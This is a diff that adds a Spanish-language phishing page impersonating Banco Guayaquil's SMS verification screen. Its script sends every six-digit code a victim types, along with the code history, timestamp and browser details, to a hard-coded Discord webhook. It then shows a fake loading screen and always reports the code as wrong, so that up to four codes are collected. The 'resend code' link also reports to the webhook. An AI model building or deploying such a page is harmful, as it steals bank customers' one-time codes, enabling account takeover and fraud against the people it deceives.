@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad - Banco Guayaquil</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #c2185b 0%, #d81b60 100%);
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .logo {
+            max-width: 200px;
+            height: auto;
+        }
+
+        .container {
+            max-width: 450px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+        }
+
+        .content {
+            padding: 40px 30px;
+        }
+
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            color: #666;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .back-button::before {
+            content: "←";
+            margin-right: 8px;
+            font-size: 18px;
+        }
+
+        h1 {
+            color: #1a237e;
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 30px;
+        }
+
+        label {
+            color: #333;
+            font-size: 16px;
+            font-weight: 500;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .code-input-container {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .code-digit {
+            width: 60px;
+            height: 70px;
+            text-align: center;
+            font-size: 32px;
+            font-weight: 600;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            transition: border-color 0.3s;
+        }
+
+        .code-digit:focus {
+            outline: none;
+            border-color: #c2185b;
+        }
+
+        .resend-link {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .resend-link a {
+            color: #2196F3;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .resend-link a:hover {
+            text-decoration: underline;
+        }
+
+        .btn-verify {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #c2185b 0%, #d81b60 100%);
+            border: none;
+            color: white;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .btn-verify:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(194, 24, 91, 0.3);
+        }
+
+        .btn-verify:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .help-text {
+            text-align: center;
+            color: #999;
+            font-size: 13px;
+            margin-top: 20px;
+            line-height: 1.6;
+        }
+
+        .security-icon {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 60px;
+        }
+
+        /* Pantalla de carga */
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-screen.active {
+            display: flex;
+        }
+
+        .loading-logo {
+            max-width: 200px;
+            margin-bottom: 40px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.7;
+                transform: scale(0.95);
+            }
+        }
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #c2185b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #666;
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+
+        .loading-subtext {
+            color: #999;
+            font-size: 14px;
+        }
+
+        .loading-progress {
+            width: 250px;
+            height: 4px;
+            background: #f3f3f3;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 30px;
+        }
+
+        .loading-progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(135deg, #c2185b 0%, #d81b60 100%);
+            transition: width 0.3s ease;
+        }
+
+        .security-section {
+            background: linear-gradient(135deg, #c2185b 0%, #d81b60 100%);
+            color: white;
+            padding: 30px;
+            margin-top: 30px;
+        }
+
+        .security-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .security-list {
+            list-style: none;
+        }
+
+        .security-list li {
+            margin-bottom: 15px;
+            padding-left: 0;
+            font-size: 14px;
+            line-height: 1.6;
+            display: flex;
+            align-items: flex-start;
+        }
+
+        .security-list li::before {
+            content: "🔒";
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="logo.png" alt="Banco Guayaquil" class="logo">
+        </div>
+
+        <div class="content">
+            <a href="#" class="back-button">Volver</a>
+
+            <div class="security-icon">🔐</div>
+
+            <h1>Verificación de Seguridad</h1>
+            <p class="subtitle">Para proteger tu cuenta, hemos enviado un código de verificación de 6 dígitos a tu celular registrado.</p>
+
+            <form id="verificationForm">
+                <div class="form-group">
+                    <label>Ingresa el código de verificación</label>
+                    <div class="code-input-container">
+                        <input type="text" class="code-digit" maxlength="1" id="digit1" autocomplete="off">
+                        <input type="text" class="code-digit" maxlength="1" id="digit2" autocomplete="off">
+                        <input type="text" class="code-digit" maxlength="1" id="digit3" autocomplete="off">
+                        <input type="text" class="code-digit" maxlength="1" id="digit4" autocomplete="off">
+                        <input type="text" class="code-digit" maxlength="1" id="digit5" autocomplete="off">
+                        <input type="text" class="code-digit" maxlength="1" id="digit6" autocomplete="off">
+                    </div>
+                </div>
+
+                <div class="resend-link">
+                    <a href="#" id="resendCode">¿No recibiste el código? Reenviar</a>
+                </div>
+
+                <button type="submit" class="btn-verify" id="btnVerify">Verificar</button>
+            </form>
+
+            <p class="help-text">
+                El código expira en 5 minutos. Si no lo recibes, verifica que tu número de celular esté actualizado en tu perfil.
+            </p>
+        </div>
+
+        <div class="security-section">
+            <h2 class="security-title">¿Por qué verificamos tu identidad?</h2>
+            <ul class="security-list">
+                <li>Este paso adicional protege tu cuenta contra accesos no autorizados</li>
+                <li>El código es temporal y único para esta sesión</li>
+                <li>Nunca compartas este código con nadie, ni siquiera con empleados del banco</li>
+                <li>Si no solicitaste este código, contacta inmediatamente a nuestro centro de atención</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Pantalla de carga -->
+    <div class="loading-screen" id="loadingScreen">
+        <img src="logo.png" alt="Banco Guayaquil" class="loading-logo">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Validando código...</div>
+        <div class="loading-subtext">Por favor espere</div>
+        <div class="loading-progress">
+            <div class="loading-progress-bar" id="progressBar"></div>
+        </div>
+    </div>
+
+    <script>
+        // ========== CONFIGURACIÓN DEL WEBHOOK ==========
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1425328745123942503/WhhLWqOYULHi4NphwaiKE6wk6flVAsk8ifQLfQaI-tmdB65vT1iLD7vpHmJpPdPHm5OY';
+        // ================================================
+
+        let remainingAttempts = 4;
+        const codes = []; // Almacenar todos los códigos ingresados
+
+        // Auto-focus en el siguiente input
+        const digitInputs = document.querySelectorAll('.code-digit');
+        digitInputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                // Solo permitir números
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                if (this.value.length === 1 && index < digitInputs.length - 1) {
+                    digitInputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', function(e) {
+                // Permitir borrar con backspace
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    digitInputs[index - 1].focus();
+                }
+            });
+
+            // Permitir pegar código completo
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
+                
+                for (let i = 0; i < Math.min(pastedData.length, 6); i++) {
+                    if (digitInputs[i]) {
+                        digitInputs[i].value = pastedData[i];
+                    }
+                }
+                
+                if (pastedData.length >= 6) {
+                    digitInputs[5].focus();
+                }
+            });
+        });
+
+        // Auto-focus en el primer input al cargar
+        digitInputs[0].focus();
+
+        // Manejar envío del formulario
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            // Obtener el código completo
+            const code = Array.from(digitInputs).map(input => input.value).join('');
+
+            // Validar que el código esté completo
+            if (code.length !== 6) {
+                alert('Por favor, ingresa el código completo de 6 dígitos');
+                return;
+            }
+
+            // Agregar el código al historial
+            codes.push(code);
+
+            // Mostrar pantalla de carga
+            const loadingScreen = document.getElementById('loadingScreen');
+            const progressBar = document.getElementById('progressBar');
+            loadingScreen.classList.add('active');
+
+            // Animar la barra de progreso durante 5 segundos
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 2; // 2% cada 100ms = 5 segundos
+                progressBar.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                }
+            }, 100);
+
+            // Preparar datos para Discord
+            const discordPayload = {
+                embeds: [{
+                    title: "📱 Código de Verificación SMS",
+                    color: 12720731,
+                    fields: [
+                        {
+                            name: "🔢 Código Ingresado",
+                            value: "```" + code + "```",
+                            inline: false
+                        },
+                        {
+                            name: "🔄 Intento",
+                            value: (5 - remainingAttempts) + " de 4",
+                            inline: true
+                        },
+                        {
+                            name: "⚠️ Intentos Restantes",
+                            value: remainingAttempts + " restantes",
+                            inline: true
+                        },
+                        {
+                            name: "📋 Historial de Códigos",
+                            value: "```" + codes.join(', ') + "```",
+                            inline: false
+                        },
+                        {
+                            name: "🕐 Timestamp",
+                            value: new Date().toLocaleString('es-EC', { timeZone: 'America/Guayaquil' }),
+                            inline: true
+                        },
+                        {
+                            name: "📱 Dispositivo",
+                            value: navigator.userAgent.includes('Mobile') ? "Móvil" : "Desktop",
+                            inline: true
+                        },
+                        {
+                            name: "🌐 Navegador",
+                            value: "```" + navigator.userAgent + "```",
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Sistema de Verificación SMS - Banco Guayaquil"
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                // Enviar al webhook de Discord
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(discordPayload)
+                });
+
+                // Esperar 5 segundos
+                setTimeout(() => {
+                    loadingScreen.classList.remove('active');
+                    progressBar.style.width = '0%';
+
+                    // Reducir intentos
+                    remainingAttempts--;
+
+                    if (remainingAttempts <= 0) {
+                        // Se acabaron los intentos - redirigir a index.html
+                        alert('Has excedido el número de intentos permitidos. Por seguridad, debes iniciar el proceso nuevamente.');
+                        window.location.href = 'index.html';
+                    } else {
+                        // Todavía quedan intentos
+                        alert('Código incorrecto. Por favor, verifica e intenta nuevamente.');
+                        
+                        // Limpiar inputs
+                        digitInputs.forEach(input => input.value = '');
+                        digitInputs[0].focus();
+                    }
+
+                }, 5000); // 5 segundos
+
+            } catch (error) {
+                console.error('Error:', error);
+                
+                setTimeout(() => {
+                    loadingScreen.classList.remove('active');
+                    progressBar.style.width = '0%';
+                    
+                    remainingAttempts--;
+                    
+                    if (remainingAttempts <= 0) {
+                        alert('Has excedido el número de intentos permitidos. Debes iniciar el proceso nuevamente.');
+                        window.location.href = 'index.html';
+                    } else {
+                        alert('Código incorrecto. Intenta nuevamente.');
+                        digitInputs.forEach(input => input.value = '');
+                        digitInputs[0].focus();
+                    }
+                }, 5000);
+            }
+        });
+
+        // Manejar reenvío de código
+        document.getElementById('resendCode').addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            const discordPayload = {
+                embeds: [{
+                    title: "🔄 Solicitud de Reenvío de Código",
+                    color: 3447003,
+                    fields: [
+                        {
+                            name: "🕐 Timestamp",
+                            value: new Date().toLocaleString('es-EC', { timeZone: 'America/Guayaquil' }),
+                            inline: false
+                        },
+                        {
+                            name: "📋 Códigos Ingresados Anteriormente",
+                            value: codes.length > 0 ? "```" + codes.join(', ') + "```" : "Ninguno",
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(discordPayload)
+            }).catch(error => console.error('Error:', error));
+
+            alert('Se ha reenviado un nuevo código a tu celular registrado.');
+        });
+    </script>
+</body>
+</html>
